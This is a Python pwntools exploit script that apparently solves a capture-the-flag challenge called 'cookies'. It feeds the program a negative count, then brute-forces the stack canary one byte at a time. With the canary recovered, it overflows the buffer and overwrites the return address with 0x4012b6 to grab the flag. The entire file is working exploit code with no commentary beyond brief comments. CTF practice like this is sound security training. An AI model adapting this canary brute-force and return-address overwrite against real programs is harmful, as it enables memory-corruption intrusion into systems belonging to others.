#!/usr/bin/env python3
from pwn import *
import time

conn = process('./cookies')

# Send the number of cookies we want
conn.recvuntil("How many cookies do you want?")
conn.sendline("-1")

start_payload =  b"A" * 8 + bytes([0])
payload = b""
# Bruteforce the canary value
canary = b""
for i in range(7):
    for c in range(256):
        conn.recvuntil("Which")
        payload = start_payload + canary + bytes([c])
        print(i+1,"/7",c,":",payload)
        conn.send_raw(payload)
        if not conn.recvuntil("*" , timeout=3):
            canary = canary + bytes([c])
            break
    

# Final payload
payload = start_payload + canary + b"B" * 8 + p64(0x4012b6)
print("Found", i+1 ,"bytes, Canary found:",canary,"\nFinal payload:\t",payload)
# Send the final payload and print the flag
conn.sendline(payload)
print(conn.recvall().decode())
